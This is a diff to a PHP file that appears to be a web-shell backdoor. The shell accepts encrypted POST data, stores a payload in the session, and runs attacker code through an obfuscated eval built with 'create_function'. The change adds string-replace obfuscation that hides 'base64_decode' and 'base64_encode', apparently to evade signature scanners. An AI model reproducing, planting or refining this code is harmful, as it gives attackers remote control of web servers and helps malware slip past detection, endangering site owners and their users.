@@ -28,19 +28,20 @@ if($c/$d-1===1 || !isset($_POST[$pass])){
 }
 }catch(Exception $e){
 if (isset($_POST[$pass])){
-    $data=ee(base64_decode($_POST[$pass]),$key);
+    $re = r();
+    $k = $re("z", "", "zbazsze64"."_zdzeczodze");
+    $h = $re("g", "", "gbgagsgeg64"."_gegngcgogdge");
+    $data=ee($k($_POST[$pass]),$key);
     if (isset($_SESSION[$payloadName])){
         $payload=ee($_SESSION[$payloadName],$key);
         if (strpos($payload,"getBasicsInfo")===false){
             $payload=ee($payload,$key);
         }
-        $re = r();
-        $k  = $re("z", "", "zbazsze64"."_zdzeczodze");
         $l = $re("p", "", "pcprpepaptpe_fp"."upnpcptpipopn");
         $f = $l('$payload', $k('ZXZhbCgkcGF5bG9hZCk7'));
         $f($payload);
         echo substr(md5($pass.$key),0,16);
-        echo base64_encode(ee(@run($data),$key));
+        echo $h(ee(@run($data),$key));
         echo substr(md5($pass.$key),16);
     }else{
         if (strpos($data,"getBasicsInfo")!==false){
